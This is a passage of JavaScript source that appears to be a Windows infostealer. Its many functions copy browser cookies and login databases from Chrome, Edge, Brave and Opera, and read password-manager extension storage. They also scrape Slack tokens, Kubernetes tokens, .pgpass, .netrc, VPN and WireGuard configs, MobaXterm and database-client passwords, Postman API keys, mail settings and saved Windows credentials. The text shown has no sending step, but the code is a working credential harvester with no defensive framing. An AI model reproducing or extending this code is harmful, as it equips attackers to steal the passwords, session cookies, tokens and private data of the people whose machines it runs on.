    if (output.trim()) result += output.trim()
  } catch (e) {}
  return result
}

function gatherusbhistory() {
  let result = ''
  try {
    const output = execSync('powershell "Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\*\\* -ErrorAction SilentlyContinue | Select-Object FriendlyName,HardwareID | Format-Table -AutoSize -HideTableHeaders"', { encoding: 'utf8', timeout: 5000 })
    if (output.trim()) {
      const lines = output.trim().split('\n').filter(l => l.trim())
      if (lines.length > 0) result += lines.join('\r\n') + '\r\n'
    }
  } catch (e) {}
  return result
}

function gatherrdpconnections() {
  let result = ''
  const rdpdir = path.join(os.homedir(), 'Documents', '*.rdp')
  try {
    const output = execSync('powershell "Get-ChildItem \\"$env:USERPROFILE\\Documents\\*.rdp\\" -ErrorAction SilentlyContinue | Select-Object Name,LastWriteTime | Format-Table -AutoSize -HideTableHeaders"', { encoding: 'utf8', timeout: 5000 })
    if (output.trim()) result += output.trim() + '\r\n'
  } catch (e) {}
  const defaultrdp = path.join(os.homedir(), 'Documents', 'Default.rdp')
  if (fs.existsSync(defaultrdp)) {
    try {
      const content = fs.readFileSync(defaultrdp, 'utf8')
      const lines = content.split('\n').filter(l => l.includes(':'))
      for (const line of lines) {
        result += `  rdp: ${line.trim()}\r\n`
      }
    } catch (e) {}
  }
  return result
}

function gatherbrowserprofiles() {
  let result = ''
  const brodirs = [
    path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'),
    path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'),
    path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    path.join(process.env.APPDATA, 'Opera Software', 'Opera Stable'),
    path.join(process.env.LOCALAPPDATA, 'Vivaldi', 'User Data'),
  ]
  for (const brodir of brodirs) {
    if (fs.existsSync(brodir)) {
      const profname = brodir.split('\\').slice(-2, -1)[0] || 'browser'
      result += `\r\n=== ${profname} profiles ===\r\n`
      try {
        const localstate = path.join(brodir, 'Local State')
        if (fs.existsSync(localstate)) {
          const ls = JSON.parse(fs.readFileSync(localstate, 'utf8'))
          const profiles = ls.profile && ls.profile.info_cache ? Object.keys(ls.profile.info_cache) : []
          for (const p of profiles) {
            const info = ls.profile.info_cache[p]
            result += `  ${p}: ${info.name || info.user_name || 'unnamed'} ${info.is_managed ? '[managed]' : ''} ${info.last_active ? new Date(info.last_active * 1000).toISOString() : ''}\r\n`
          }
        }
      } catch (e) {}
    }
  }
  return result
}

function gatherbrowserfiles() {
  let result = ''
  const targets = {
    cookies: ['Network\\Cookies', 'Cookies'].map(s => '\\' + s),
    logindata: ['Web Data'],
    history: ['History'],
    bookmarks: ['Bookmarks'],
    sessions: ['Current Session', 'Current Tabs', 'Last Session', 'Last Tabs'],
    extensions: ['Extensions'],
  }
  const brodirs = [
    { name: 'chrome', path: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data'), defaultProfile: 'Default' },
    { name: 'edge', path: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'), defaultProfile: 'Default' },
    { name: 'brave', path: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'), defaultProfile: 'Default' },
    { name: 'opera', path: path.join(process.env.APPDATA, 'Opera Software', 'Opera Stable'), defaultProfile: '' },
  ]
  const exportdir = path.join(__dirname, 'browser_data')
  try { if (!fs.existsSync(exportdir)) fs.mkdirSync(exportdir) } catch (e) {}
  for (const bro of brodirs) {
    if (!fs.existsSync(bro.path)) continue
    try {
      const localstate = path.join(bro.path, 'Local State')
      let profnames = ['Default']
      if (fs.existsSync(localstate)) {
        try {
          const ls = JSON.parse(fs.readFileSync(localstate, 'utf8'))
          const cache = ls.profile && ls.profile.info_cache
          if (cache) profnames = Object.keys(cache)
        } catch (e) {}
      }
      for (const prof of profnames) {
        const profdir = bro.defaultProfile ? path.join(bro.path, prof) : bro.path
        for (const [category, filenames] of Object.entries(targets)) {
          for (const fname of filenames) {
            const srcpath = profdir + fname
            if (fs.existsSync(srcpath)) {
              try {
                const destname = `${bro.name}_${prof}_${category}_${fname.replace(/\\/g, '_')}`
                const destpath = path.join(exportdir, destname)
                fs.copyFileSync(srcpath, destpath)
                const stats = fs.statSync(srcpath)
                result += `${bro.name}/${prof}: ${fname.split('\\').pop()} copied (${Math.round(stats.size / 1024)}kb)\r\n`
              } catch (e) {}
              break
            }
          }
        }
      }
    } catch (e) {}
  }
  return result
}

function gatherchromeextrawallets() {
  let result = ''
  const brodirs = [
    path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings'),
    path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Extension Settings'),
    path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Extension Settings'),
  ]
  const extraids = {
    'bhhhlbepdkbapadjlnokjndnceigpndb': 'bitwarden',
    'jbkfoedolllekgbhcbcoahefnbanhhlh': 'lastpass',
    'hdokiejnpimakedhajhdlcegeplioahd': 'lastpass legacy',
    'ffelagendccnplbgppmfplepfglbekdi': 'dashlane',
    'fdjamakpfbbddfjaooikfcpapjohcfmg': 'protonpass',
    'ghmbeldphafepmbjdfdpjhhhcejdnmlj': 'keeper',
    'oeepldmndjldbldebcmcdblepamdnnii': 'roboform',
    'kbfnbcgphnpndmmmojmfejajlppjgjld': 'enpass',
    'pdgbckkfpmkbjaofokmgocijfoakmiof': 'nordpass',
    'flcpelaaagoeghlpghgpmjiclhbmmkeg': '1password',
    'aomjjhallfgjeglblehebfpbcfeobpgk': '1password legacy',
    'odjhifogjckkjgkolinaapjbbkbkfklk': 'sticky password',
    'clbgmpplgmhbjlcmoledfajkfkjdfppk': 'true key',
    'pnjaodmknglahhkaalcmgdoafjlmlfko': 'myki',
    'lhkmpbfcaejifmhabmclhodlblephfoj': 'avast passwords',
  }
  for (const extdir of brodirs) {
    if (!fs.existsSync(extdir)) continue
    try {
      for (const extid of fs.readdirSync(extdir)) {
        const name = extraids[extid]
        if (name) {
          result += `  ${name} (${extid})\r\n`
          try {
            for (const f of fs.readdirSync(path.join(extdir, extid))) {
              if (f.endsWith('.log') || f.endsWith('.ldb')) {
                const content = fs.readFileSync(path.join(extdir, extid, f), 'utf8')
                if (content.length > 5) result += `    ${f}: ${content.substring(0, 300)}\r\n`
              }
            }
          } catch (e) {}
        }
      }
    } catch (e) {}
  }
  return result
}

function gatherfoxdata() {
  let result = ''
  const foxdirs = [
    { name: 'firefox', path: path.join(process.env.APPDATA, 'Mozilla', 'Firefox', 'Profiles') },
    { name: 'waterfox', path: path.join(process.env.APPDATA, 'Waterfox', 'Profiles') },
    { name: 'librewolf', path: path.join(process.env.APPDATA, 'LibreWolf', 'Profiles') },
    { name: 'pale moon', path: path.join(process.env.APPDATA, 'Moonchild Productions', 'Pale Moon', 'Profiles') },
  ]
  for (const fox of foxdirs) {
    if (!fs.existsSync(fox.path)) continue
    result += `\r\n=== ${fox.name} profiles ===\r\n`
    try {
      for (const prof of fs.readdirSync(fox.path)) {
        const profdir = path.join(fox.path, prof)
        if (!fs.statSync(profdir).isDirectory()) continue
        result += `  ${prof}\r\n`
        const logins = path.join(profdir, 'logins.json')
        if (fs.existsSync(logins)) result += '    logins.json present\r\n'
        const key4 = path.join(profdir, 'key4.db')
        if (fs.existsSync(key4)) result += '    key4.db present\r\n'
        const cookies = path.join(profdir, 'cookies.sqlite')
        if (fs.existsSync(cookies)) result += '    cookies.sqlite present\r\n'
        const places = path.join(profdir, 'places.sqlite')
        if (fs.existsSync(places)) {
          const stats = fs.statSync(places)
          result += `    places.sqlite (${Math.round(stats.size / 1024)}kb)\r\n`
        }
        const cert9 = path.join(profdir, 'cert9.db')
        if (fs.existsSync(cert9)) result += '    cert9.db present\r\n'
        const session = path.join(profdir, 'sessionstore.jsonlz4')
        if (fs.existsSync(session)) result += '    sessionstore present\r\n'
        const addons = path.join(profdir, 'extensions.json')
        if (fs.existsSync(addons)) result += '    extensions.json present\r\n'
      }
    } catch (e) {}
  }
  return result
}

function gatherdiscordadditional() {
  let result = ''
  const dirs = [
    path.join(process.env.APPDATA, 'discord', 'settings.json'),
    path.join(process.env.APPDATA, 'discordptb', 'settings.json'),
    path.join(process.env.APPDATA, 'discordcanary', 'settings.json'),
  ]
  for (const sf of dirs) {
    if (fs.existsSync(sf)) {
      try {
        const content = JSON.parse(fs.readFileSync(sf, 'utf8'))
        for (const [key, value] of Object.entries(content)) {
          if (typeof value === 'string' && value.length > 0) {
            result += `  ${key}: ${value}\r\n`
          }
        }
      } catch (e) {}
    }
  }
  const crashpad = path.join(process.env.LOCALAPPDATA, 'Discord', 'Crashpad')
  if (fs.existsSync(crashpad)) result += 'discord crash reports available\r\n'
  return result
}

function gathermessengerapps() {
  let result = ''
  const messengerpaths = {
    signal: path.join(process.env.APPDATA, 'Signal'),
    element: path.join(process.env.APPDATA, 'Element'),
    whatsapp: path.join(process.env.LOCALAPPDATA, 'WhatsApp'),
    whatsapp_roam: path.join(process.env.APPDATA, 'WhatsApp'),
    slack: path.join(process.env.APPDATA, 'Slack'),
    skype: path.join(process.env.APPDATA, 'Skype'),
    zoom: path.join(process.env.APPDATA, 'Zoom'),
    teams: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Teams'),
    riot: path.join(process.env.APPDATA, 'Riot'),
    session: path.join(process.env.APPDATA, 'Session'),
    threema: path.join(process.env.APPDATA, 'Threema'),
    keybase: path.join(process.env.LOCALAPPDATA, 'Keybase'),
    session_pb: path.join(process.env.APPDATA, 'Session Desktop'),
    discord_better: path.join(process.env.APPDATA, 'BetterDiscord'),
    vencord: path.join(process.env.APPDATA, 'Vencord'),
  }
  for (const [name, mpath] of Object.entries(messengerpaths)) {
    if (fs.existsSync(mpath)) {
      result += `${name}: ${mpath}\r\n`
      try {
        if (name === 'signal') {
          try {
            const sqlfile = path.join(mpath, 'config.json')
            if (fs.existsSync(sqlfile)) {
              const config = JSON.parse(fs.readFileSync(sqlfile, 'utf8'))
              result += `  number: ${config.number || '?'}\r\n`
            }
          } catch (e) {}
        }
        if (name === 'slack') {
          try {
            const cookies = path.join(mpath, 'Cookies')
            if (fs.existsSync(cookies)) result += '  cookies present\r\n'
            const storage = path.join(mpath, 'Local Storage', 'leveldb')
            if (fs.existsSync(storage)) {
              const files = fs.readdirSync(storage).filter(f => f.endsWith('.ldb') || f.endsWith('.log'))
              for (const f of files.slice(0, 3)) {
                const content = fs.readFileSync(path.join(storage, f), 'utf8')
                const tokens = content.match(/xox[bsap]-[\w-]+/g)
                if (tokens) for (const t of tokens) result += `  slack token: ${t}\r\n`
              }
            }
          } catch (e) {}
        }
        if (name === 'teams') {
          try {
            const storage = path.join(mpath, 'Local Storage', 'leveldb')
            if (fs.existsSync(storage)) {
              const files = fs.readdirSync(storage).filter(f => f.endsWith('.ldb') || f.endsWith('.log'))
              result += `  ${files.length} leveldb files\r\n`
            }
          } catch (e) {}
        }
      } catch (e) {}
    }
  }
  return result
}

function gathervpnconfigs() {
  let result = ''
  const opvdirs = [
    path.join(os.homedir(), 'AppData', 'Roaming', 'OpenVPN', 'config'),
    path.join(os.homedir(), 'Documents', 'OpenVPN', 'config'),
    'C:\\Program Files\\OpenVPN\\config',
    'C:\\Program Files (x86)\\OpenVPN\\config',
  ]
  for (const dir of opvdirs) {
    if (fs.existsSync(dir)) {
      result += `openvpn configs: ${dir}\r\n`
      try {
        for (const f of fs.readdirSync(dir)) {
          if (f.endsWith('.ovpn')) {
            result += `  ${f}\r\n`
            try {
              const content = fs.readFileSync(path.join(dir, f), 'utf8')
              const authlines = content.split('\n').filter(l => l.includes('auth') || l.includes('cert') || l.includes('key') || l.includes('password') || l.includes('user'))
              for (const al of authlines) result += `    ${al.trim()}\r\n`
            } catch (e) {}
          }
        }
      } catch (e) {}
    }
  }
  const wireguard = path.join(os.homedir(), 'AppData', 'Roaming', 'WireGuard')
  if (fs.existsSync(wireguard)) {
    result += 'wireguard installed\r\n'
    try {
      for (const f of fs.readdirSync(wireguard)) {
        if (f.endsWith('.conf')) {
          const content = fs.readFileSync(path.join(wireguard, f), 'utf8')
          result += `  ${f}: ${content.substring(0, 500)}\r\n`
        }
      }
    } catch (e) {}
  }
  return result
}

function getallbrowsercredentials() {
  let result = ''
  const credpaths = {
    chrome: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
    edge: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
    brave: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Login Data'),
    opera: path.join(process.env.APPDATA, 'Opera Software', 'Opera Stable', 'Login Data'),
    vivaldi: path.join(process.env.LOCALAPPDATA, 'Vivaldi', 'User Data', 'Default', 'Login Data'),
  }
  const exportdir = path.join(__dirname, 'browser_data')
  try { if (!fs.existsSync(exportdir)) fs.mkdirSync(exportdir) } catch (e) {}
  for (const [browser, lpath] of Object.entries(credpaths)) {
    if (fs.existsSync(lpath)) {
      try {
        const dest = path.join(exportdir, `${browser}_Login_Data`)
        fs.copyFileSync(lpath, dest)
        const stats = fs.statSync(lpath)
        result += `${browser}: Login Data copied (${Math.round(stats.size / 1024)}kb, DPAPI encrypted)\r\n`
      } catch (e) {}
    }
  }
  return result
}

function gatherdiscordthemes() {
  let result = ''
  const themedirs = [
    path.join(process.env.APPDATA, 'BetterDiscord', 'themes'),
    path.join(process.env.APPDATA, 'BetterDiscord', 'plugins'),
    path.join(process.env.APPDATA, 'Vencord', 'themes'),
    path.join(process.env.APPDATA, 'Vencord', 'dist'),
  ]
  for (const dir of themedirs) {
    if (fs.existsSync(dir)) {
      try {
        const items = fs.readdirSync(dir)
        if (items.length > 0) {
          const name = dir.split('\\').slice(-2).join('\\')
          result += `${name}: ${items.length} files\r\n`
          for (const item of items.slice(0, 10)) {
            result += `  ${item}\r\n`
          }
        }
      } catch (e) {}
    }
  }
  return result
}

function gatherwindowssavedcreds() {
  let result = ''
  try {
    const output = execSync('cmdkey /list', { encoding: 'utf8', timeout: 5000 })
    for (const line of output.split('\n')) {
      if (line.includes('Target:')) {
        const target = line.split('Target:')[1].trim()
        result += `  ${target}\r\n`
      }
    }
    if (!result) result += '  (none)\r\n'
  } catch (e) {
    result += '  (failed)\r\n'
  }
  return result
}

function gatherentracreds() {
  let result = ''
  const dockerconf = path.join(os.homedir(), '.docker', 'config.json')
  if (fs.existsSync(dockerconf)) {
    try {
      const content = JSON.parse(fs.readFileSync(dockerconf, 'utf8'))
      const auths = content.auths || {}
      for (const [reg, creds] of Object.entries(auths)) {
        if (creds.auth || creds.username) result += `docker: ${reg} ${creds.username || '(token)'}\r\n`
      }
      if (content.credsStore) result += `docker cred store: ${content.credsStore}\r\n`
    } catch (e) {}
  }
  if (fs.existsSync(path.join(os.homedir(), '.docker'))) result += 'docker desktop installed\r\n'
  const kubeconf = path.join(os.homedir(), '.kube', 'config')
  if (fs.existsSync(kubeconf)) {
    try {
      const content = fs.readFileSync(kubeconf, 'utf8')
      const clusters = content.match(/cluster:.*?\n/g) || []
      const users = content.match(/user:.*?\n/g) || []
      const tokens = content.match(/token:.*/g) || []
      result += `kubernetes: ${clusters.length} clusters, ${users.length} users`
      if (tokens.length > 0) {
        result += ', tokens found'
        for (const t of tokens) result += `\r\n  ${t.trim().substring(0, 60)}...`
      }
      result += '\r\n'
    } catch (e) {}
  }
  const pgpass = path.join(os.homedir(), '.pgpass')
  if (fs.existsSync(pgpass)) {
    try {
      const content = fs.readFileSync(pgpass, 'utf8')
      for (const line of content.split('\n').filter(l => l.trim() && !l.startsWith('#'))) {
        result += `pgpass: ${line.trim()}\r\n`
      }
    } catch (e) {}
  }
  const mycnf = path.join(os.homedir(), '.my.cnf')
  if (fs.existsSync(mycnf)) {
    try {
      const content = fs.readFileSync(mycnf, 'utf8')
      for (const line of content.split('\n').filter(l => l.includes('=') && !l.trim().startsWith('#'))) {
        result += `mysql: ${line.trim()}\r\n`
      }
    } catch (e) {}
  }
  const netrc = path.join(os.homedir(), '.netrc')
  if (fs.existsSync(netrc)) {
    try {
      const content = fs.readFileSync(netrc, 'utf8')
      result += `netrc:\r\n${content}\r\n`
    } catch (e) {}
  }
  return result
}

function gathervscodedata() {
  let result = ''
  const vscdir = path.join(process.env.APPDATA, 'Code', 'User')
  if (fs.existsSync(vscdir)) {
    result += 'vs code installed\r\n'
    const settings = path.join(vscdir, 'settings.json')
    if (fs.existsSync(settings)) {
      try {
        const content = fs.readFileSync(settings, 'utf8')
        if (content.length > 500) result += `  settings.json (${content.length} bytes)\r\n`
      } catch (e) {}
    }
    const keybindings = path.join(vscdir, 'keybindings.json')
    if (fs.existsSync(keybindings)) result += '  keybindings.json present\r\n'
    const extensions = path.join(process.env.APPDATA, 'Code', 'extensions')
    if (fs.existsSync(extensions)) {
      try {
        const extlist = fs.readdirSync(extensions)
        if (extlist.length > 0) result += `  ${extlist.length} extensions installed\r\n`
        for (const ext of extlist.slice(0, 15)) result += `    ${ext}\r\n`
      } catch (e) {}
    }
    const storage = path.join(process.env.APPDATA, 'Code', 'Local Storage', 'leveldb')
    if (fs.existsSync(storage)) {
      const files = fs.readdirSync(storage).filter(f => f.endsWith('.ldb') || f.endsWith('.log'))
      result += `  storage leveldb: ${files.length} files\r\n`
    }
  }
  const vscinsiders = path.join(process.env.APPDATA, 'Code - Insiders', 'User')
  if (fs.existsSync(vscinsiders)) result += 'vs code insiders installed\r\n'
  const vscodium = path.join(process.env.APPDATA, 'VSCodium', 'User')
  if (fs.existsSync(vscodium)) result += 'vscodium installed\r\n'
  const cursor = path.join(process.env.APPDATA, 'Cursor', 'User')
  if (fs.existsSync(cursor)) result += 'cursor installed\r\n'
  return result
}

function gatherputtysessions() {
  let result = ''
  try {
    const sessions = execSync('reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s 2>nul', { encoding: 'utf8', timeout: 5000 })
    const lines = sessions.split('\n').filter(l => l.includes('HostName') || l.includes('PortNumber') || l.includes('UserName'))
    for (const line of lines.slice(0, 40)) {
      result += `  ${line.trim()}\r\n`
    }
  } catch (e) {}
  return result
}

function gathermobaxterm() {
  let result = ''
  const mobini = path.join(process.env.APPDATA, 'MobaXterm', 'MobaXterm.ini')
  if (fs.existsSync(mobini)) {
    result += 'mobaxterm installed\r\n'
    try {
      const content = fs.readFileSync(mobini, 'utf8')
      const bookmarklines = content.split('\n').filter(l => l.includes('Bookmark') || l.includes('Username=') || l.includes('Password=') || l.includes('Host=') || l.includes('Port=') || l.includes('Protocol='))
      for (const line of bookmarklines.slice(0, 50)) {
        result += `  ${line.trim()}\r\n`
      }
      const password = content.match(/Password="([^"]+)"/)
      if (password) result += `  mobaxterm master password hash: ${password[1]}\r\n`
    } catch (e) {}
  }
  return result
}

function gatherdbconnections() {
  let result = ''
  const mysqlwb = path.join(process.env.APPDATA, 'MySQL', 'Workbench', 'connections.xml')
  if (fs.existsSync(mysqlwb)) {
    result += 'mysql workbench connections present\r\n'
    try {
      const content = fs.readFileSync(mysqlwb, 'utf8')
      const conns = content.match(/<value type="string"[^>]*>[^<]+<\/value>/g) || []
      for (const conn of conns) {
        const val = conn.replace(/<[^>]+>/g, '')
        result += `  ${val}\r\n`
      }
    } catch (e) {}
  }
  const heidisql = path.join(process.env.APPDATA, 'HeidiSQL', 'Sessions')
  if (fs.existsSync(heidisql)) {
    result += 'heidisql installed\r\n'
    try {
      for (const f of fs.readdirSync(heidisql)) {
        if (f.endsWith('.txt') || f.endsWith('.xml')) {
          const content = fs.readFileSync(path.join(heidisql, f), 'utf8')
          const hosts = content.match(/Host=[^\r\n]+|Server=[^\r\n]+|User=[^\r\n]+|Password=[^\r\n]+/g)
          if (hosts) for (const h of hosts) result += `  ${h.trim()}\r\n`
        }
      }
    } catch (e) {}
  }
  const pgadmin = path.join(process.env.APPDATA, 'pgAdmin', 'pgadmin4.db')
  if (fs.existsSync(pgadmin)) {
    result += 'pgadmin: pgadmin4.db present\r\n'
  }
  const dbeaver = path.join(os.homedir(), '.dbeaver', 'credentials-config.json')
  if (fs.existsSync(dbeaver)) {
    result += 'dbeaver credentials present\r\n'
    try {
      const content = fs.readFileSync(dbeaver, 'utf8')
      result += `  ${content.substring(0, 500)}\r\n`
    } catch (e) {}
  }
  const dbeavercreds = path.join(os.homedir(), '.dbeaver', 'credentials-*')
  try {
    const dbeaverrc = path.join(os.homedir(), '.dbeaver')
    if (fs.existsSync(dbeaverrc)) {
      for (const f of fs.readdirSync(dbeaverrc)) {
        if (f.includes('credential') || f.includes('connection') || f.endsWith('.db')) {
          result += `  dbeaver: ${f}\r\n`
        }
      }
    }
  } catch (e) {}
  const mongocompass = path.join(process.env.APPDATA, 'MongoDB Compass', 'Connection', 'Favorite-*.json')
  try {
    const mcdir = path.join(process.env.APPDATA, 'MongoDB Compass')
    if (fs.existsSync(mcdir)) {
      result += 'mongodb compass installed\r\n'
      for (const f of fs.readdirSync(mcdir)) {
        if (f.endsWith('.json')) {
          const content = fs.readFileSync(path.join(mcdir, f), 'utf8')
          const connstrs = content.match(/mongodb(?:\+srv)?:\/\/[^"'\s]+/g)
          if (connstrs) for (const c of connstrs) result += `  ${c}\r\n`
        }
      }
    }
  } catch (e) {}
  const postman = path.join(process.env.APPDATA, 'Postman')
  if (fs.existsSync(postman)) {
    result += 'postman installed\r\n'
    try {
      const storage = path.join(postman, 'storage', 'indexedDB')
      if (fs.existsSync(storage)) {
        for (const f of fs.readdirSync(storage).filter(f => f.endsWith('.ldb') || f.endsWith('.log'))) {
          try {
            const content = fs.readFileSync(path.join(storage, f), 'utf8')
            const apikeys = content.match(/(?:api_key|apikey|token|bearer)[":\s]*([a-zA-Z0-9_\-\.]+)/gi)
            if (apikeys) for (const ak of apikeys) result += `  postman: ${ak.substring(0, 60)}\r\n`
          } catch (e) {}
        }
      }
    } catch (e) {}
  }
  const azuredatastudio = path.join(process.env.APPDATA, 'azuredatastudio', 'User', 'settings.json')
  if (fs.existsSync(azuredatastudio)) result += 'azure data studio installed\r\n'
  const tableplus = path.join(process.env.APPDATA, 'TablePlus', 'Data')
  if (fs.existsSync(tableplus)) {
    result += 'tableplus installed\r\n'
    try {
      for (const f of fs.readdirSync(tableplus).filter(f => f.endsWith('.sqlite') || f.endsWith('.json'))) {
        result += `  ${f}\r\n`
      }
    } catch (e) {}
  }
  return result
}

function gathergamedata() {
  let result = ''
  const epicdir = path.join(process.env.LOCALAPPDATA, 'Epic Games', 'UnrealEngineLauncher', 'Saved', 'Config', 'Windows')
  if (fs.existsSync(epicdir)) {
    result += 'epic games launcher installed\r\n'
    try {
      const loginfile = path.join(process.env.LOCALAPPDATA, 'Epic Games', 'UnrealEngineLauncher', 'Saved', 'webcache', 'Login.json')
      if (fs.existsSync(loginfile)) {
        const content = fs.readFileSync(loginfile, 'utf8')
        if (content.length > 10) result += `  epic login data (${Math.round(content.length / 1024)}kb)\r\n`
      }
    } catch (e) {}
  }
  const btndir = path.join(process.env.LOCALAPPDATA, 'Battle.net')
  if (fs.existsSync(btndir)) {
    result += 'battle.net installed\r\n'
    try {
      const btlfile = path.join(btndir, 'Battle.net.config')
      if (fs.existsSync(btlfile)) result += `  battle.net config (${fs.statSync(btlfile).size} bytes)\r\n`
    } catch (e) {}
  }
  const riotdir = path.join(process.env.LOCALAPPDATA, 'Riot Games', 'Riot Client', 'Config')
  if (fs.existsSync(riotdir)) {
    result += 'riot games installed\r\n'
  }
  const originpath = path.join(process.env.LOCALAPPDATA, 'Origin')
  if (fs.existsSync(originpath)) result += 'origin installed\r\n'
  const uplay = path.join(process.env.LOCALAPPDATA, 'Ubisoft Game Launcher')
  if (fs.existsSync(uplay)) result += 'ubisoft connect installed\r\n'
  const galaxy = path.join(process.env.LOCALAPPDATA, 'GOG.com', 'Galaxy')
  if (fs.existsSync(galaxy)) result += 'gog galaxy installed\r\n'
  return result
}

function gatherthunderbird() {
  let result = ''
  const tbdir = path.join(process.env.APPDATA, 'Thunderbird', 'Profiles')
  if (fs.existsSync(tbdir)) {
    result += 'thunderbird installed\r\n'
    try {
      for (const prof of fs.readdirSync(tbdir)) {
        const profdir = path.join(tbdir, prof)
        if (!fs.statSync(profdir).isDirectory()) continue
        const prefs = path.join(profdir, 'prefs.js')
        if (fs.existsSync(prefs)) {
          try {
            const content = fs.readFileSync(prefs, 'utf8')
            const creds = content.split('\n').filter(l => l.includes('password') || l.includes('smtp') || l.includes('imap') || l.includes('pop3') || l.includes('mail.server'))
            for (const line of creds.slice(0, 30)) result += `  ${line.trim().substring(0, 200)}\r\n`
          } catch (e) {}
        }
        const logins = path.join(profdir, 'logins.json')
        if (fs.existsSync(logins)) result += `  ${prof}: logins.json present\r\n`
        const keydb = path.join(profdir, 'key4.db')
        if (fs.existsSync(keydb)) result += `  ${prof}: key4.db present\r\n`
      }
    } catch (e) {}
  }
  return result
}

function gatheroutlookprofiles() {
  let result = ''
  try {
    const outlook = execSync('powershell "Get-ItemProperty \\"HKCU:\\Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\*\\" -ErrorAction SilentlyContinue | Select-Object PSChildName | Format-Table -AutoSize -HideTableHeaders"', { encoding: 'utf8', timeout: 5000 })
    if (outlook.trim()) result += `outlook profiles:\r\n${outlook.trim()}\r\n`
  } catch (e) {}
  try {
    const mail = execSync('powershell "Get-ChildItem \\"$env:LOCALAPPDATA\\Microsoft\\Windows Mail\\*\\" -ErrorAction SilentlyContinue | Select-Object Name | Format-Table -AutoSize -HideTableHeaders"', { encoding: 'utf8', timeout: 5000 })
    if (mail.trim()) result += `windows mail:\r\n${mail.trim()}\r\n`
  } catch (e) {}
  try {
    const live = execSync('powershell "Get-ChildItem \\"$env:LOCALAPPDATA\\Microsoft\\Windows Live Mail\\*\\" -ErrorAction SilentlyContinue | Select-Object Name | Format-Table -AutoSize -HideTableHeaders"', { encoding: 'utf8', timeout: 5000 })
    if (live.trim()) result += `windows live mail:\r\n${live.trim()}\r\n`
  } catch (e) {}
  return result
}

function gatherspotify() {
  let result = ''
  const spotdir = path.join(process.env.APPDATA, 'Spotify')
  if (fs.existsSync(spotdir)) {
    result += 'spotify installed\r\n'
    try {
      const users = path.join(spotdir, 'users')
      if (fs.existsSync(users)) {
        for (const user of fs.readdirSync(users)) {
          const userdir = path.join(users, user)
          if (fs.statSync(userdir).isDirectory()) {
            result += `  user: ${user}\r\n`
            const adjs = path.join(userdir, 'ad-manager.json')
            if (fs.existsSync(adjs)) result += '    ad-manager present\r\n'
            const storage = path.join(userdir, 'Local Storage', 'leveldb')
            if (fs.existsSync(storage)) {
              const files = fs.readdirSync(storage).filter(f => f.endsWith('.ldb') || f.endsWith('.log'))
              result += `    leveldb: ${files.length} files\r\n`
            }
          }
        }
      }
    } catch (e) {}
  }
  return result
}

function gatherwsl() {
  let result = ''
  try {
    const wsl = execSync('wsl -l -v 2>$null', { encoding: 'utf8', timeout: 5000 })
    if (wsl.trim()) result += `wsl:\r\n${wsl.trim()}\r\n`
  } catch (e) {}
  try {
    const wslconf = path.join(os.homedir(), '.wslconfig')
    if (fs.existsSync(wslconf)) {
      const content = fs.readFileSync(wslconf, 'utf8')
      if (content.trim()) result += `wslconfig:\r\n${content}\r\n`
    }
  } catch (e) {}
  return result
}

function gatherhostsfile() {
  let result = ''
  try {
    const hosts = fs.readFileSync('C:\\Windows\\System32\\drivers\\etc\\hosts', 'utf8')
    const entries = hosts.split('\n').filter(l => l.trim() && !l.trim().startsWith('#') && !l.trim().startsWith(' '))
    for (const entry of entries) {
      result += `  ${entry.trim()}\r\n`
    }
    if (!result) result += '  (no custom entries)\r\n'
  } catch (e) {
    result += '  (access denied)\r\n'
  }
  return result
}

function gathercerts() {
  let result = ''
  try {
    const mycerts = execSync('powershell "Get-ChildItem -Path Cert:\\CurrentUser\\My -ErrorAction SilentlyContinue | Select-Object Subject,Thumbprint,NotAfter | Format-Table -AutoSize -HideTableHeaders"', { encoding: 'utf8', timeout: 5000 })
    if (mycerts.trim()) result += `personal certs:\r\n${mycerts.trim()}\r\n`
  } catch (e) {}
  try {
    const store = execSync('powershell "Get-ChildItem -Path Cert:\\CurrentUser\\ -ErrorAction SilentlyContinue | Select-Object PSChildName | Format-Table -AutoSize -HideTableHeaders"', { encoding: 'utf8', timeout: 5000 })
    if (store.trim()) result += `cert stores:\r\n${store.trim()}\r\n`
  } catch (e) {}
  return result
}

function gatherservices() {
  let result = ''
  try {
    const svcs = execSync('wmic service get name,displayname,startname /format:csv', { encoding: 'utf8', timeout: 5000 })
    for (const line of svcs.split('\n')) {
      const parts = line.trim().split(',')
      if (parts.length >= 3 && parts[2] && parts[1] && parts[2] !== 'Name') {
        const sn = parts[3] || ''
        if (!sn.includes('SYSTEM') && !sn.includes('LOCAL') && !sn.includes('NETWORK')) {
          result += `  ${parts[2]}\r\n`
        }
      }
    }
    if (!result) result += '  (none)\r\n'
  } catch (e) {}
  return result
}

function gatherallleveldb() {
  let result = ''
  const exportdir = path.join(__dirname, 'browser_data')
  try { if (!fs.existsSync(exportdir)) fs.mkdirSync(exportdir) } catch (e) {}
  const basedirs = [
    { name: 'chrome', path: path.join(process.env.LOCALAPPDATA, 'Google', 'Chrome', 'User Data') },
    { name: 'edge', path: path.join(process.env.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data') },
    { name: 'brave', path: path.join(process.env.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data') },
  ]
  for (const bro of basedirs) {
    if (!fs.existsSync(bro.path)) continue
    try {
